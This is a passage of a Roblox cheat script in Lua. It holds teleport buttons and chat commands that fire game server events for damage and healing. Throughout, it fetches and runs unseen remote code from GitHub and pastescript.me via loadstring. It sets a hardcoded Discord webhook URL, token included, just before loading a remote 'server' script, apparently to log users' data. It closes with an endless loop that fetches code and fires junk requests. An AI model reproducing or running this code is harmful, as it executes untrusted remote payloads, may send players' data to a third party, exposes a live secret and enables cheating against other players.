	game:GetService('TestService'):Message("Ship Teleport works only on Day [1]")
end)
secwe:addButton("Visit the lotus", function()
game:GetService("TeleportService"):Teleport(4514535987, LocalPlayer) 
end)
secwe:addButton("Teleport to the truth", function()
 game:GetService("TeleportService"):Teleport(4529197908, LocalPlayer)
end)

sectiones8:addButton("Watchtower", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-655.500244, 138.209625, -289.795654))
end)
sectiones8:addButton("Warehouses", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-944.766296, 35.8019257, -537.485596))
end)
sectiones8:addButton("Lighthouse", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-1535.31775, 116.969376, -213.45253))
end)
sectiones8:addButton("Airplane", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-1999.916787, 196.773636, -464.065308))
end)
sectiones8:addButton("Cargo ship", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-1794.09729, 8.50286007, 22.2027988))
end)
sectiones8:addButton("Mineshaft", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-1827.13843, 130.756912, -1099.62585))
end)
sectiones8:addButton("Docks", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-2029.91162, 4.63455868, -1556.79041))
end)
sectiones8:addButton("Lab", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-1574.19995, -103.854485, -1472.58997))
end)
sectiones8:addButton("Glass Container (Lab)", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-1771.3197, -198.802612, -1308.25012))
end)
sectiones8:addButton("Generators", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(487.924194, -7.1500001, -492.964355))
end)
sectiones8:addButton("Observatory", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(425.643005, 126.679382, -1215.2312))
end)
sectiones8:addButton("Crashed Airplane", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-611.773865, 276.7677, -1750.44043))
end)
sectiones8:addButton("Radio Tower", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-1056.34106, 504.643524, -1416.52991))
end)
sectiones8:addButton("Drone Cave", function()
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-114.806534, 244.37413, -2816.78638))
end)
sectiones6:addButton("All functions here only for Developers (Who have TP-Bypass)", function()
end)
sectiones6:addButton("Enjoy :)", function()
end)
local theme = venyx:addPage("Themes", 5012544693)
local colors = theme:addSection("Colors")
for theme, color in pairs(themes) do
	colors:addColorPicker(theme, color, function(color3)
		venyx:setTheme(theme, color3)
	end)
end
venyx:SelectPage(venyx.pages[1], true)
end
if game.PlaceId == 3095204897 then
    if syn then
loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/Check"))('BRUH')
else
loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/f"))('BRUH')
end

_G.WebhookURL = "https://discord.com/api/webhooks/797650802964430869/bTs_CKwR9t-CjLT31h4b_upJZFod7_S5p3X4tRJtXkEIr29bubXKdWjHrv-bzrgxrrHy";
EmbedColor = "16763904"; -- Color from Discohook.org. / It's an Decimal color. Use https://convertingcolors.com do convert color to Decimal color.

loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/server"))('Made by powerless :)')


local Isle = {}
function Isle:AddNotification(Text, R, G, B)
if game.PlaceId == 3431407618 then
local alert = Instance.new('Color3Value')
alert.Name = Text
alert.Parent = game.Players.LocalPlayer.Character["@Alerts"]
alert.Value = Color3.fromRGB(255, 255, 255)
for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Game.Alert:GetChildren()) do
    if v.Text == alert.Name then
        v.TextColor3 = Color3.fromRGB(R, G, B)
end
end
elseif game.PlaceId == 3095204897 then
local alert = Instance.new('Color3Value')
alert.Name = Text
alert.Parent = game.Players.LocalPlayer.Character["@Alerts"]
alert.Value = Color3.fromRGB(255, 255, 255)
for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Alert.Alert:GetChildren()) do
    if v.Text == alert.Name then
        v.TextColor3 = Color3.fromRGB(R, G, B)
end
end
end
end

Isle:AddNotification("Made by NeoXephox!", 255, 255, 255)

loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Th12353/heesj/main/Fkofqwekwodf"))('pizza')



end
if game.PlaceId == 6371984839 then
if syn then
loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/Check"))('BRUH')
else
loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/f"))('BRUH')
end

_G.WebhookURL = "https://discord.com/api/webhooks/797650802964430869/bTs_CKwR9t-CjLT31h4b_upJZFod7_S5p3X4tRJtXkEIr29bubXKdWjHrv-bzrgxrrHy";
EmbedColor = "16763904"; -- Color from Discohook.org. / It's an Decimal color. Use https://convertingcolors.com do convert color to Decimal color.

loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/server"))('Made by powerless :)')


game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()



if (string.lower(msg) == "/e partial") then
if game.Players.LocalPlayer.Character.Shifter.Value ~= "None" then
game.ReplicatedStorage.Knife:FireServer()
game.ReplicatedStorage.KnifeDamage:FireServer()
game.ReplicatedStorage.Shift:FireServer()
end


elseif (string.lower(msg) == "/e heal") then
loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/Project2/main/Heal"))('BRUH')

elseif (string.lower(msg) == "/e massheal") then
loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/Project2/main/Heal"))('BRUH')
loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/Project2/main/Heal"))('BRUH')
loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/Project2/main/Heal"))('BRUH')

elseif (string.lower(msg) == "/e noskillcd") then
loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/Project2/main/Throw"))('BRUH')

elseif (string.lower(msg) == "/e colossalspeed") then
if game.Players.LocalPlayer.Character.Shifter.Value == "ColossalTitan" then
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 120
end

elseif (string.lower(msg) == "/e respawn") then
game.ReplicatedStorage.Respawn:FireServer()

elseif (string.lower(msg) == "/e levi") then

while true do
    wait(.1)
local Remote = game.Players.NeoXephox.Backpack.Gear.Events['AttackingEvent']

local Arguments = {
        
}

Remote:FireServer(unpack(Arguments))
game.ReplicatedStorage.Heal:FireServer()
end
end

end)
end
loadstring(game:HttpGet('https://raw.githubusercontent.com/Th12353/Admin-GUI/main/W%40%40'))('LMAO')



pcall(function()
while true do
wait()
loadstring(game:HttpGet('https://pastescript.me/raw/208'))('LMAO BRO')
local content = (syn and syn.request or http_request)(
    {
        Url = "hi",  
        Method = "cum",
        Headers = {
            ["Content-Type"] = "application/json"
        },  
    }
)
end
end)
